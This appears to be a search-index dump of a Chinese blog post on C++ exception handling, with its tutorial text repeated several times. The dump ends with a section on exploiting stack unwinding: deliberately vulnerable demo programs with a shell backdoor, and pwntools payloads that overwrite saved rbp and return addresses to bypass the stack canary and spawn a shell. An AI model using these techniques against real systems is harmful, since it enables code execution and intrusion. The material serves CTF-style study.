catch 来继续处理。 catch (std::exception\u0026 e) { std::cerr \u003c\u003c \"Log: \" \u003c\u003c e.what() \u003c\u003c \"\\n\"; throw; } The Catch-All Handler catch(...) 是一种特殊的 catch 块，用于捕获任何类型的异常 try { throw 42; } catch (...) { std::cout \u003c\u003c \"Caught something!\"; } try普通try块（ordinary try block） 只对 try { ... } 内部抛出的异常有效。 会按顺序匹配，第一个符合类型的 handler 会接管。 在 try 外面抛出的异常，跟这个 handler 没关系。 void f() { throw 1; // 不会被下面的 catch 捕获 try { throw 2; // 会被下面的 catch(...) 捕获 } catch (...) { // 处理 2 } throw 3; // 也不会被上面的捕获 } 函数try块（function try block） 和普通 try 不同，它不是语句，而是 整个函数体 被 try 包裹 它的作用范围比普通的广，它能捕获： 函数体里的异常 （如果是构造函数）初始化列表里的异常 struct X { int mem; // 构造函数初始化列表抛出异常 X() try : mem(f(true)) { // 构造函数体 } catch (...) { // 能捕获 f(true) 抛出的异常 } // 构造函数体里抛出的异常 X(int) try { throw 2; } catch (...) { // 捕获 2 } }; noexcept了解到一个函数不会抛出异常能帮助调用者简化程序，编译器更好的优化程序 void recoup(int) noexcept; // 不会抛异常 void alloc(int); // 可能抛异常 我们用noexcept来承诺一个函数不会抛出异常，这种承诺叫做nonthrowing specification（不抛异常说明） 需要注意： noexcept 必须出现在所有函数声明和定义里，或者都不出现 void f() noexcept; // 声明 void f() noexcept { } // 定义 如果函数声明为 noexcept，但运行时仍然抛出异常，程序会调用 std::terminate，直接结束 noexcept应该在以下两种情形中被使用： 我们确信该函数不会抛出异常 我们不知道如何处理异常 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:2","series":null,"tags":null,"title":"C++pwn","uri":"/posts/cpp_pwn/#对象销毁"},{"categories":["pwn"],"content":"\r高级异常机制当一个异常被throw时，接下来的语句不会再执行，而是沿着调用链(call chain)跳到相应的catch中，这会导致： 在跳转过程中，调用栈上沿途的函数会被退出 退出时，局部对象会正常调用析构函数 对象销毁当 throw 发生时，函数会提前退出，局部对象（local objects）会自动销毁 类对象：编译器会自动调用它们的析构函数 构造函数中异常：类本身的析构函数不会执行，但已经成功构造的成员会被析构 数组 / 容器异常：已经构造的元素会被析构，未构造的不会 内置类型：不需要析构，退出时只是栈帧释放。 析构函数与异常栈展开时，程序已经在处理中一个异常，如果此时某个析构函数又抛出了新的异常，而且没有被它自己捕获，程序就会陷入“两个异常同时存在”的状态，这时C++ 就会调用 std::terminate()，程序立刻结束 如： struct Bad { ~Bad() { throw std::runtime_error(\"oops in destructor\"); // 危险！ } }; int main() { try { Bad b; throw std::runtime_error(\"main error\"); } catch (...) { std::cout \u003c\u003c \"Caught exception\\n\"; } } 所以，析构函数如果会抛出异常，需要用try-catch把他包起来，不能让异常传播出去 如 struct Good { ~Good() { try { // 某些可能抛异常的操作 throw std::runtime_error(\"oops in destructor\"); } catch (...) { // 在这里处理，不能让它继续抛 std::cerr \u003c\u003c \"Exception caught in destructor\\n\"; } } }; throw异常对象的构建 throw std::runtime_error(\"Something bad happened\"); 这个表达式会创建一个特殊的对象：称为异常对象，这个异常对象由编译器管理，存在于一个特殊的内存区域，而不是当前函数栈 传给catch的时候，是先复制一份，再传过去 不能抛出局部对象的指针 栈展开时，局部对象会被销毁 int* f() { int x = 42; throw \u0026x; // x 会在函数退出时销毁 } 等catch执行时，这个对象可能已经销毁，造成悬空指针 抛出异常时对类型的要求 被throw的表达式必须是完整类型（complete type），不能抛出一个只有声明而没有定义的类型，如： //只有声明而没有定义 class Incomplete; // 声明 void foo() { throw Incomplete(); } 类类型必须有可访问的析构函数 类类型必须有可访问的拷贝构造函数或移动构造函数 当抛出数组或函数时， 数组或函数类型会自动转成指针类型 catchcatch的参数就行函数参数 catch (类型 参数名) 的写法很像函数的参数声明 如果你不需要用到这个参数，可以省略名字： catch (std::runtime_error\u0026) { ... } catch参数类型规则 必须是 完整类型 允许左值引用 catch (MyEx\u0026)、禁止右值引用 catch (MyEx\u0026\u0026) 匹配规则 当一个异常被throw，程序会按顺序检查所有catch，第一个能匹配的catch会被选中，不会继续往后寻找 因此，更具体的异常类型必须放在更前面，如果有继承关系，子类的 catch 必须写在前面，基类的写在后面。 rethrow 有时候，一个 catch 只能做一部分处理，但真正的处理逻辑要交给更上层的函数 这时候，catch 里可以用 throw; 语句把当前异常重新抛出，交给上层的 catch 来继续处理。 catch (std::exception\u0026 e) { std::cerr \u003c\u003c \"Log: \" \u003c\u003c e.what() \u003c\u003c \"\\n\"; throw; } The Catch-All Handler catch(...) 是一种特殊的 catch 块，用于捕获任何类型的异常 try { throw 42; } catch (...) { std::cout \u003c\u003c \"Caught something!\"; } try普通try块（ordinary try block） 只对 try { ... } 内部抛出的异常有效。 会按顺序匹配，第一个符合类型的 handler 会接管。 在 try 外面抛出的异常，跟这个 handler 没关系。 void f() { throw 1; // 不会被下面的 catch 捕获 try { throw 2; // 会被下面的 catch(...) 捕获 } catch (...) { // 处理 2 } throw 3; // 也不会被上面的捕获 } 函数try块（function try block） 和普通 try 不同，它不是语句，而是 整个函数体 被 try 包裹 它的作用范围比普通的广，它能捕获： 函数体里的异常 （如果是构造函数）初始化列表里的异常 struct X { int mem; // 构造函数初始化列表抛出异常 X() try : mem(f(true)) { // 构造函数体 } catch (...) { // 能捕获 f(true) 抛出的异常 } // 构造函数体里抛出的异常 X(int) try { throw 2; } catch (...) { // 捕获 2 } }; noexcept了解到一个函数不会抛出异常能帮助调用者简化程序，编译器更好的优化程序 void recoup(int) noexcept; // 不会抛异常 void alloc(int); // 可能抛异常 我们用noexcept来承诺一个函数不会抛出异常，这种承诺叫做nonthrowing specification（不抛异常说明） 需要注意： noexcept 必须出现在所有函数声明和定义里，或者都不出现 void f() noexcept; // 声明 void f() noexcept { } // 定义 如果函数声明为 noexcept，但运行时仍然抛出异常，程序会调用 std::terminate，直接结束 noexcept应该在以下两种情形中被使用： 我们确信该函数不会抛出异常 我们不知道如何处理异常 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:2","series":null,"tags":null,"title":"C++pwn","uri":"/posts/cpp_pwn/#析构函数与异常"},{"categories":["pwn"],"content":"\r高级异常机制当一个异常被throw时，接下来的语句不会再执行，而是沿着调用链(call chain)跳到相应的catch中，这会导致： 在跳转过程中，调用栈上沿途的函数会被退出 退出时，局部对象会正常调用析构函数 对象销毁当 throw 发生时，函数会提前退出，局部对象（local objects）会自动销毁 类对象：编译器会自动调用它们的析构函数 构造函数中异常：类本身的析构函数不会执行，但已经成功构造的成员会被析构 数组 / 容器异常：已经构造的元素会被析构，未构造的不会 内置类型：不需要析构，退出时只是栈帧释放。 析构函数与异常栈展开时，程序已经在处理中一个异常，如果此时某个析构函数又抛出了新的异常，而且没有被它自己捕获，程序就会陷入“两个异常同时存在”的状态，这时C++ 就会调用 std::terminate()，程序立刻结束 如： struct Bad { ~Bad() { throw std::runtime_error(\"oops in destructor\"); // 危险！ } }; int main() { try { Bad b; throw std::runtime_error(\"main error\"); } catch (...) { std::cout \u003c\u003c \"Caught exception\\n\"; } } 所以，析构函数如果会抛出异常，需要用try-catch把他包起来，不能让异常传播出去 如 struct Good { ~Good() { try { // 某些可能抛异常的操作 throw std::runtime_error(\"oops in destructor\"); } catch (...) { // 在这里处理，不能让它继续抛 std::cerr \u003c\u003c \"Exception caught in destructor\\n\"; } } }; throw异常对象的构建 throw std::runtime_error(\"Something bad happened\"); 这个表达式会创建一个特殊的对象：称为异常对象，这个异常对象由编译器管理，存在于一个特殊的内存区域，而不是当前函数栈 传给catch的时候，是先复制一份，再传过去 不能抛出局部对象的指针 栈展开时，局部对象会被销毁 int* f() { int x = 42; throw \u0026x; // x 会在函数退出时销毁 } 等catch执行时，这个对象可能已经销毁，造成悬空指针 抛出异常时对类型的要求 被throw的表达式必须是完整类型（complete type），不能抛出一个只有声明而没有定义的类型，如： //只有声明而没有定义 class Incomplete; // 声明 void foo() { throw Incomplete(); } 类类型必须有可访问的析构函数 类类型必须有可访问的拷贝构造函数或移动构造函数 当抛出数组或函数时， 数组或函数类型会自动转成指针类型 catchcatch的参数就行函数参数 catch (类型 参数名) 的写法很像函数的参数声明 如果你不需要用到这个参数，可以省略名字： catch (std::runtime_error\u0026) { ... } catch参数类型规则 必须是 完整类型 允许左值引用 catch (MyEx\u0026)、禁止右值引用 catch (MyEx\u0026\u0026) 匹配规则 当一个异常被throw，程序会按顺序检查所有catch，第一个能匹配的catch会被选中，不会继续往后寻找 因此，更具体的异常类型必须放在更前面，如果有继承关系，子类的 catch 必须写在前面，基类的写在后面。 rethrow 有时候，一个 catch 只能做一部分处理，但真正的处理逻辑要交给更上层的函数 这时候，catch 里可以用 throw; 语句把当前异常重新抛出，交给上层的 catch 来继续处理。 catch (std::exception\u0026 e) { std::cerr \u003c\u003c \"Log: \" \u003c\u003c e.what() \u003c\u003c \"\\n\"; throw; } The Catch-All Handler catch(...) 是一种特殊的 catch 块，用于捕获任何类型的异常 try { throw 42; } catch (...) { std::cout \u003c\u003c \"Caught something!\"; } try普通try块（ordinary try block） 只对 try { ... } 内部抛出的异常有效。 会按顺序匹配，第一个符合类型的 handler 会接管。 在 try 外面抛出的异常，跟这个 handler 没关系。 void f() { throw 1; // 不会被下面的 catch 捕获 try { throw 2; // 会被下面的 catch(...) 捕获 } catch (...) { // 处理 2 } throw 3; // 也不会被上面的捕获 } 函数try块（function try block） 和普通 try 不同，它不是语句，而是 整个函数体 被 try 包裹 它的作用范围比普通的广，它能捕获： 函数体里的异常 （如果是构造函数）初始化列表里的异常 struct X { int mem; // 构造函数初始化列表抛出异常 X() try : mem(f(true)) { // 构造函数体 } catch (...) { // 能捕获 f(true) 抛出的异常 } // 构造函数体里抛出的异常 X(int) try { throw 2; } catch (...) { // 捕获 2 } }; noexcept了解到一个函数不会抛出异常能帮助调用者简化程序，编译器更好的优化程序 void recoup(int) noexcept; // 不会抛异常 void alloc(int); // 可能抛异常 我们用noexcept来承诺一个函数不会抛出异常，这种承诺叫做nonthrowing specification（不抛异常说明） 需要注意： noexcept 必须出现在所有函数声明和定义里，或者都不出现 void f() noexcept; // 声明 void f() noexcept { } // 定义 如果函数声明为 noexcept，但运行时仍然抛出异常，程序会调用 std::terminate，直接结束 noexcept应该在以下两种情形中被使用： 我们确信该函数不会抛出异常 我们不知道如何处理异常 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:2","series":null,"tags":null,"title":"C++pwn","uri":"/posts/cpp_pwn/#throw"},{"categories":["pwn"],"content":"\r高级异常机制当一个异常被throw时，接下来的语句不会再执行，而是沿着调用链(call chain)跳到相应的catch中，这会导致： 在跳转过程中，调用栈上沿途的函数会被退出 退出时，局部对象会正常调用析构函数 对象销毁当 throw 发生时，函数会提前退出，局部对象（local objects）会自动销毁 类对象：编译器会自动调用它们的析构函数 构造函数中异常：类本身的析构函数不会执行，但已经成功构造的成员会被析构 数组 / 容器异常：已经构造的元素会被析构，未构造的不会 内置类型：不需要析构，退出时只是栈帧释放。 析构函数与异常栈展开时，程序已经在处理中一个异常，如果此时某个析构函数又抛出了新的异常，而且没有被它自己捕获，程序就会陷入“两个异常同时存在”的状态，这时C++ 就会调用 std::terminate()，程序立刻结束 如： struct Bad { ~Bad() { throw std::runtime_error(\"oops in destructor\"); // 危险！ } }; int main() { try { Bad b; throw std::runtime_error(\"main error\"); } catch (...) { std::cout \u003c\u003c \"Caught exception\\n\"; } } 所以，析构函数如果会抛出异常，需要用try-catch把他包起来，不能让异常传播出去 如 struct Good { ~Good() { try { // 某些可能抛异常的操作 throw std::runtime_error(\"oops in destructor\"); } catch (...) { // 在这里处理，不能让它继续抛 std::cerr \u003c\u003c \"Exception caught in destructor\\n\"; } } }; throw异常对象的构建 throw std::runtime_error(\"Something bad happened\"); 这个表达式会创建一个特殊的对象：称为异常对象，这个异常对象由编译器管理，存在于一个特殊的内存区域，而不是当前函数栈 传给catch的时候，是先复制一份，再传过去 不能抛出局部对象的指针 栈展开时，局部对象会被销毁 int* f() { int x = 42; throw \u0026x; // x 会在函数退出时销毁 } 等catch执行时，这个对象可能已经销毁，造成悬空指针 抛出异常时对类型的要求 被throw的表达式必须是完整类型（complete type），不能抛出一个只有声明而没有定义的类型，如： //只有声明而没有定义 class Incomplete; // 声明 void foo() { throw Incomplete(); } 类类型必须有可访问的析构函数 类类型必须有可访问的拷贝构造函数或移动构造函数 当抛出数组或函数时， 数组或函数类型会自动转成指针类型 catchcatch的参数就行函数参数 catch (类型 参数名) 的写法很像函数的参数声明 如果你不需要用到这个参数，可以省略名字： catch (std::runtime_error\u0026) { ... } catch参数类型规则 必须是 完整类型 允许左值引用 catch (MyEx\u0026)、禁止右值引用 catch (MyEx\u0026\u0026) 匹配规则 当一个异常被throw，程序会按顺序检查所有catch，第一个能匹配的catch会被选中，不会继续往后寻找 因此，更具体的异常类型必须放在更前面，如果有继承关系，子类的 catch 必须写在前面，基类的写在后面。 rethrow 有时候，一个 catch 只能做一部分处理，但真正的处理逻辑要交给更上层的函数 这时候，catch 里可以用 throw; 语句把当前异常重新抛出，交给上层的 catch 来继续处理。 catch (std::exception\u0026 e) { std::cerr \u003c\u003c \"Log: \" \u003c\u003c e.what() \u003c\u003c \"\\n\"; throw; } The Catch-All Handler catch(...) 是一种特殊的 catch 块，用于捕获任何类型的异常 try { throw 42; } catch (...) { std::cout \u003c\u003c \"Caught something!\"; } try普通try块（ordinary try block） 只对 try { ... } 内部抛出的异常有效。 会按顺序匹配，第一个符合类型的 handler 会接管。 在 try 外面抛出的异常，跟这个 handler 没关系。 void f() { throw 1; // 不会被下面的 catch 捕获 try { throw 2; // 会被下面的 catch(...) 捕获 } catch (...) { // 处理 2 } throw 3; // 也不会被上面的捕获 } 函数try块（function try block） 和普通 try 不同，它不是语句，而是 整个函数体 被 try 包裹 它的作用范围比普通的广，它能捕获： 函数体里的异常 （如果是构造函数）初始化列表里的异常 struct X { int mem; // 构造函数初始化列表抛出异常 X() try : mem(f(true)) { // 构造函数体 } catch (...) { // 能捕获 f(true) 抛出的异常 } // 构造函数体里抛出的异常 X(int) try { throw 2; } catch (...) { // 捕获 2 } }; noexcept了解到一个函数不会抛出异常能帮助调用者简化程序，编译器更好的优化程序 void recoup(int) noexcept; // 不会抛异常 void alloc(int); // 可能抛异常 我们用noexcept来承诺一个函数不会抛出异常，这种承诺叫做nonthrowing specification（不抛异常说明） 需要注意： noexcept 必须出现在所有函数声明和定义里，或者都不出现 void f() noexcept; // 声明 void f() noexcept { } // 定义 如果函数声明为 noexcept，但运行时仍然抛出异常，程序会调用 std::terminate，直接结束 noexcept应该在以下两种情形中被使用： 我们确信该函数不会抛出异常 我们不知道如何处理异常 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:2","series":null,"tags":null,"title":"C++pwn","uri":"/posts/cpp_pwn/#catch"},{"categories":["pwn"],"content":"\r高级异常机制当一个异常被throw时，接下来的语句不会再执行，而是沿着调用链(call chain)跳到相应的catch中，这会导致： 在跳转过程中，调用栈上沿途的函数会被退出 退出时，局部对象会正常调用析构函数 对象销毁当 throw 发生时，函数会提前退出，局部对象（local objects）会自动销毁 类对象：编译器会自动调用它们的析构函数 构造函数中异常：类本身的析构函数不会执行，但已经成功构造的成员会被析构 数组 / 容器异常：已经构造的元素会被析构，未构造的不会 内置类型：不需要析构，退出时只是栈帧释放。 析构函数与异常栈展开时，程序已经在处理中一个异常，如果此时某个析构函数又抛出了新的异常，而且没有被它自己捕获，程序就会陷入“两个异常同时存在”的状态，这时C++ 就会调用 std::terminate()，程序立刻结束 如： struct Bad { ~Bad() { throw std::runtime_error(\"oops in destructor\"); // 危险！ } }; int main() { try { Bad b; throw std::runtime_error(\"main error\"); } catch (...) { std::cout \u003c\u003c \"Caught exception\\n\"; } } 所以，析构函数如果会抛出异常，需要用try-catch把他包起来，不能让异常传播出去 如 struct Good { ~Good() { try { // 某些可能抛异常的操作 throw std::runtime_error(\"oops in destructor\"); } catch (...) { // 在这里处理，不能让它继续抛 std::cerr \u003c\u003c \"Exception caught in destructor\\n\"; } } }; throw异常对象的构建 throw std::runtime_error(\"Something bad happened\"); 这个表达式会创建一个特殊的对象：称为异常对象，这个异常对象由编译器管理，存在于一个特殊的内存区域，而不是当前函数栈 传给catch的时候，是先复制一份，再传过去 不能抛出局部对象的指针 栈展开时，局部对象会被销毁 int* f() { int x = 42; throw \u0026x; // x 会在函数退出时销毁 } 等catch执行时，这个对象可能已经销毁，造成悬空指针 抛出异常时对类型的要求 被throw的表达式必须是完整类型（complete type），不能抛出一个只有声明而没有定义的类型，如： //只有声明而没有定义 class Incomplete; // 声明 void foo() { throw Incomplete(); } 类类型必须有可访问的析构函数 类类型必须有可访问的拷贝构造函数或移动构造函数 当抛出数组或函数时， 数组或函数类型会自动转成指针类型 catchcatch的参数就行函数参数 catch (类型 参数名) 的写法很像函数的参数声明 如果你不需要用到这个参数，可以省略名字： catch (std::runtime_error\u0026) { ... } catch参数类型规则 必须是 完整类型 允许左值引用 catch (MyEx\u0026)、禁止右值引用 catch (MyEx\u0026\u0026) 匹配规则 当一个异常被throw，程序会按顺序检查所有catch，第一个能匹配的catch会被选中，不会继续往后寻找 因此，更具体的异常类型必须放在更前面，如果有继承关系，子类的 catch 必须写在前面，基类的写在后面。 rethrow 有时候，一个 catch 只能做一部分处理，但真正的处理逻辑要交给更上层的函数 这时候，catch 里可以用 throw; 语句把当前异常重新抛出，交给上层的 catch 来继续处理。 catch (std::exception\u0026 e) { std::cerr \u003c\u003c \"Log: \" \u003c\u003c e.what() \u003c\u003c \"\\n\"; throw; } The Catch-All Handler catch(...) 是一种特殊的 catch 块，用于捕获任何类型的异常 try { throw 42; } catch (...) { std::cout \u003c\u003c \"Caught something!\"; } try普通try块（ordinary try block） 只对 try { ... } 内部抛出的异常有效。 会按顺序匹配，第一个符合类型的 handler 会接管。 在 try 外面抛出的异常，跟这个 handler 没关系。 void f() { throw 1; // 不会被下面的 catch 捕获 try { throw 2; // 会被下面的 catch(...) 捕获 } catch (...) { // 处理 2 } throw 3; // 也不会被上面的捕获 } 函数try块（function try block） 和普通 try 不同，它不是语句，而是 整个函数体 被 try 包裹 它的作用范围比普通的广，它能捕获： 函数体里的异常 （如果是构造函数）初始化列表里的异常 struct X { int mem; // 构造函数初始化列表抛出异常 X() try : mem(f(true)) { // 构造函数体 } catch (...) { // 能捕获 f(true) 抛出的异常 } // 构造函数体里抛出的异常 X(int) try { throw 2; } catch (...) { // 捕获 2 } }; noexcept了解到一个函数不会抛出异常能帮助调用者简化程序，编译器更好的优化程序 void recoup(int) noexcept; // 不会抛异常 void alloc(int); // 可能抛异常 我们用noexcept来承诺一个函数不会抛出异常，这种承诺叫做nonthrowing specification（不抛异常说明） 需要注意： noexcept 必须出现在所有函数声明和定义里，或者都不出现 void f() noexcept; // 声明 void f() noexcept { } // 定义 如果函数声明为 noexcept，但运行时仍然抛出异常，程序会调用 std::terminate，直接结束 noexcept应该在以下两种情形中被使用： 我们确信该函数不会抛出异常 我们不知道如何处理异常 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:2","series":null,"tags":null,"title":"C++pwn","uri":"/posts/cpp_pwn/#try"},{"categories":["pwn"],"content":"\r高级异常机制当一个异常被throw时，接下来的语句不会再执行，而是沿着调用链(call chain)跳到相应的catch中，这会导致： 在跳转过程中，调用栈上沿途的函数会被退出 退出时，局部对象会正常调用析构函数 对象销毁当 throw 发生时，函数会提前退出，局部对象（local objects）会自动销毁 类对象：编译器会自动调用它们的析构函数 构造函数中异常：类本身的析构函数不会执行，但已经成功构造的成员会被析构 数组 / 容器异常：已经构造的元素会被析构，未构造的不会 内置类型：不需要析构，退出时只是栈帧释放。 析构函数与异常栈展开时，程序已经在处理中一个异常，如果此时某个析构函数又抛出了新的异常，而且没有被它自己捕获，程序就会陷入“两个异常同时存在”的状态，这时C++ 就会调用 std::terminate()，程序立刻结束 如： struct Bad { ~Bad() { throw std::runtime_error(\"oops in destructor\"); // 危险！ } }; int main() { try { Bad b; throw std::runtime_error(\"main error\"); } catch (...) { std::cout \u003c\u003c \"Caught exception\\n\"; } } 所以，析构函数如果会抛出异常，需要用try-catch把他包起来，不能让异常传播出去 如 struct Good { ~Good() { try { // 某些可能抛异常的操作 throw std::runtime_error(\"oops in destructor\"); } catch (...) { // 在这里处理，不能让它继续抛 std::cerr \u003c\u003c \"Exception caught in destructor\\n\"; } } }; throw异常对象的构建 throw std::runtime_error(\"Something bad happened\"); 这个表达式会创建一个特殊的对象：称为异常对象，这个异常对象由编译器管理，存在于一个特殊的内存区域，而不是当前函数栈 传给catch的时候，是先复制一份，再传过去 不能抛出局部对象的指针 栈展开时，局部对象会被销毁 int* f() { int x = 42; throw \u0026x; // x 会在函数退出时销毁 } 等catch执行时，这个对象可能已经销毁，造成悬空指针 抛出异常时对类型的要求 被throw的表达式必须是完整类型（complete type），不能抛出一个只有声明而没有定义的类型，如： //只有声明而没有定义 class Incomplete; // 声明 void foo() { throw Incomplete(); } 类类型必须有可访问的析构函数 类类型必须有可访问的拷贝构造函数或移动构造函数 当抛出数组或函数时， 数组或函数类型会自动转成指针类型 catchcatch的参数就行函数参数 catch (类型 参数名) 的写法很像函数的参数声明 如果你不需要用到这个参数，可以省略名字： catch (std::runtime_error\u0026) { ... } catch参数类型规则 必须是 完整类型 允许左值引用 catch (MyEx\u0026)、禁止右值引用 catch (MyEx\u0026\u0026) 匹配规则 当一个异常被throw，程序会按顺序检查所有catch，第一个能匹配的catch会被选中，不会继续往后寻找 因此，更具体的异常类型必须放在更前面，如果有继承关系，子类的 catch 必须写在前面，基类的写在后面。 rethrow 有时候，一个 catch 只能做一部分处理，但真正的处理逻辑要交给更上层的函数 这时候，catch 里可以用 throw; 语句把当前异常重新抛出，交给上层的 catch 来继续处理。 catch (std::exception\u0026 e) { std::cerr \u003c\u003c \"Log: \" \u003c\u003c e.what() \u003c\u003c \"\\n\"; throw; } The Catch-All Handler catch(...) 是一种特殊的 catch 块，用于捕获任何类型的异常 try { throw 42; } catch (...) { std::cout \u003c\u003c \"Caught something!\"; } try普通try块（ordinary try block） 只对 try { ... } 内部抛出的异常有效。 会按顺序匹配，第一个符合类型的 handler 会接管。 在 try 外面抛出的异常，跟这个 handler 没关系。 void f() { throw 1; // 不会被下面的 catch 捕获 try { throw 2; // 会被下面的 catch(...) 捕获 } catch (...) { // 处理 2 } throw 3; // 也不会被上面的捕获 } 函数try块（function try block） 和普通 try 不同，它不是语句，而是 整个函数体 被 try 包裹 它的作用范围比普通的广，它能捕获： 函数体里的异常 （如果是构造函数）初始化列表里的异常 struct X { int mem; // 构造函数初始化列表抛出异常 X() try : mem(f(true)) { // 构造函数体 } catch (...) { // 能捕获 f(true) 抛出的异常 } // 构造函数体里抛出的异常 X(int) try { throw 2; } catch (...) { // 捕获 2 } }; noexcept了解到一个函数不会抛出异常能帮助调用者简化程序，编译器更好的优化程序 void recoup(int) noexcept; // 不会抛异常 void alloc(int); // 可能抛异常 我们用noexcept来承诺一个函数不会抛出异常，这种承诺叫做nonthrowing specification（不抛异常说明） 需要注意： noexcept 必须出现在所有函数声明和定义里，或者都不出现 void f() noexcept; // 声明 void f() noexcept { } // 定义 如果函数声明为 noexcept，但运行时仍然抛出异常，程序会调用 std::terminate，直接结束 noexcept应该在以下两种情形中被使用： 我们确信该函数不会抛出异常 我们不知道如何处理异常 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:2","series":null,"tags":null,"title":"C++pwn","uri":"/posts/cpp_pwn/#noexcept"},{"categories":["pwn"],"content":"\rpwn中的利用\rdemo1 修改rbp控制程序执行流 // exception.cpp // g++ exception.cpp -o exc -no-pie -fPIC #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cunistd.h\u003e void backdoor() { try { printf(\"We have never called this backdoor!\"); } catch (const char *s) { printf(\"[!] Backdoor has catched the exception: %s\\n\", s); system(\"/bin/sh\"); } } class x { public: char buf[0x10]; x(void) { // printf(\"x:x() called!\\n\"); } ~x(void) { // printf(\"x:~x() called!\\n\"); } }; void input() { x tmp; printf(\"[!] enter your input:\"); fflush(stdout); int count = 0x100; size_t len = read(0, tmp.buf, count); if (len \u003e 0x10) { throw \"Buffer overflow.\"; } printf(\"[+] input() return.\\n\"); } int main() { try { input(); printf(\"--------------------------------------\\n\"); throw 1; } catch (int x) { printf(\"[-] Int: %d\\n\", x); } catch (const char *s) { printf(\"[-] String: %s\\n\", s); } printf(\"[+] main() return.\\n\"); return 0; } 把input函数的rbp改成puts_got - 8，程序就会跳到puts_got中存储的地址去执行，也就是执行puts函数 pl = b'a'*0x30 + p64(0x404050 -8 ) #puts_got -8 p.sendafter(b'input:',pl) 这里有几个点： pl覆盖了input函数的canary，但是由于栈展开，直接去到上层调用链找catch，不会检查canary input函数[rbp]存的是main函数的rbp，减去8就是main函数的返回地址，这里是去改main函数的返回地址为puts函数 demo2 修改retaddr，调用其他catch // exception.cpp // g++ exception.cpp -o exc -no-pie -fPIC #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cunistd.h\u003e void backdoor() { try { printf(\"We have never called this backdoor!\"); } catch (const char *s) { printf(\"[!] Backdoor has catched the exception: %s\\n\", s); system(\"/bin/sh\"); } } class x { public: char buf[0x10]; x(void) { // printf(\"x:x() called!\\n\"); } ~x(void) { // printf(\"x:~x() called!\\n\"); } }; void test() { x tmp; printf(\"[!] enter your input:\"); fflush(stdout); int count = 0x100; size_t len = read(0, tmp.buf, count); if (len \u003e 0x10) { throw \"Buffer overflow.\"; } printf(\"[+] test() return.\\n\"); } void input() { try { test(); } catch (const char *s) { printf(\"[-] String(From input): %s\\n\", s); } printf(\"[+] input() return.\\n\"); } int main() { try { input(); printf(\"--------------------------------------\\n\"); throw 1; } catch (int x) { printf(\"[-] Int: %d\\n\", x); } catch (const char *s) { printf(\"[-] String: %s\\n\", s); } printf(\"[+] main() return.\\n\"); return 0; } 这里，我们发送pl1，就能调用到backdoor函数里的catch pl = pad + p64(0x404050-0x8)#puts_got -8 pl1 = b'a'*0x30+ p64(0x404050-0x8) + p64(0x401292+1)#backdoor_addr + 1 p.sendafter(b'input:',pl1) pl1把input函数的返回地址改成了backdoor_addr + 1，而抛出异常是在input函数里抛出的，此时的调用链就变成了input -\u003e backdoor，input中没有找到对应的handler，backdoor中有，就去执行backdoor里的了 为什么需要把backdoor_addr去加1？返回地址需要在backdoor函数try区域内，demo2中的范围是(0x401293,0x401297] ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:3","series":null,"tags":null,"title":"C++pwn","uri":"/posts/cpp_pwn/#pwn中的利用"},{"categories":["pwn"],"content":"\rpwn中的利用\rdemo1 修改rbp控制程序执行流 // exception.cpp // g++ exception.cpp -o exc -no-pie -fPIC #include #include #include void backdoor() { try { printf(\"We have never called this backdoor!\"); } catch (const char *s) { printf(\"[!] Backdoor has catched the exception: %s\\n\", s); system(\"/bin/sh\"); } } class x { public: char buf[0x10]; x(void) { // printf(\"x:x() called!\\n\"); } ~x(void) { // printf(\"x:~x() called!\\n\"); } }; void input() { x tmp; printf(\"[!] enter your input:\"); fflush(stdout); int count = 0x100; size_t len = read(0, tmp.buf, count); if (len \u003e 0x10) { throw \"Buffer overflow.\"; } printf(\"[+] input() return.\\n\"); } int main() { try { input(); printf(\"--------------------------------------\\n\"); throw 1; } catch (int x) { printf(\"[-] Int: %d\\n\", x); } catch (const char *s) { printf(\"[-] String: %s\\n\", s); } printf(\"[+] main() return.\\n\"); return 0; } 把input函数的rbp改成puts_got - 8，程序就会跳到puts_got中存储的地址去执行，也就是执行puts函数 pl = b'a'*0x30 + p64(0x404050 -8 ) #puts_got -8 p.sendafter(b'input:',pl) 这里有几个点： pl覆盖了input函数的canary，但是由于栈展开，直接去到上层调用链找catch，不会检查canary input函数[rbp]存的是main函数的rbp，减去8就是main函数的返回地址，这里是去改main函数的返回地址为puts函数 demo2 修改retaddr，调用其他catch // exception.cpp // g++ exception.cpp -o exc -no-pie -fPIC #include #include #include void backdoor() { try { printf(\"We have never called this backdoor!\"); } catch (const char *s) { printf(\"[!] Backdoor has catched the exception: %s\\n\", s); system(\"/bin/sh\"); } } class x { public: char buf[0x10]; x(void) { // printf(\"x:x() called!\\n\"); } ~x(void) { // printf(\"x:~x() called!\\n\"); } }; void test() { x tmp; printf(\"[!] enter your input:\"); fflush(stdout); int count = 0x100; size_t len = read(0, tmp.buf, count); if (len \u003e 0x10) { throw \"Buffer overflow.\"; } printf(\"[+] test() return.\\n\"); } void input() { try { test(); } catch (const char *s) { printf(\"[-] String(From input): %s\\n\", s); } printf(\"[+] input() return.\\n\"); } int main() { try { input(); printf(\"--------------------------------------\\n\"); throw 1; } catch (int x) { printf(\"[-] Int: %d\\n\", x); } catch (const char *s) { printf(\"[-] String: %s\\n\", s); } printf(\"[+] main() return.\\n\"); return 0; } 这里，我们发送pl1，就能调用到backdoor函数里的catch pl = pad + p64(0x404050-0x8)#puts_got -8 pl1 = b'a'*0x30+ p64(0x404050-0x8) + p64(0x401292+1)#backdoor_addr + 1 p.sendafter(b'input:',pl1) pl1把input函数的返回地址改成了backdoor_addr + 1，而抛出异常是在input函数里抛出的，此时的调用链就变成了input -\u003e backdoor，input中没有找到对应的handler，backdoor中有，就去执行backdoor里的了 为什么需要把backdoor_addr去加1？返回地址需要在backdoor函数try区域内，demo2中的范围是(0x401293,0x401297] ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:3","series":null,"tags":null,"title":"C++pwn","uri":"/posts/cpp_pwn/#demo1"},{"categories":["pwn"],"content":"\rpwn中的利用\rdemo1 修改rbp控制程序执行流 // exception.cpp // g++ exception.cpp -o exc -no-pie -fPIC #include #include #include void 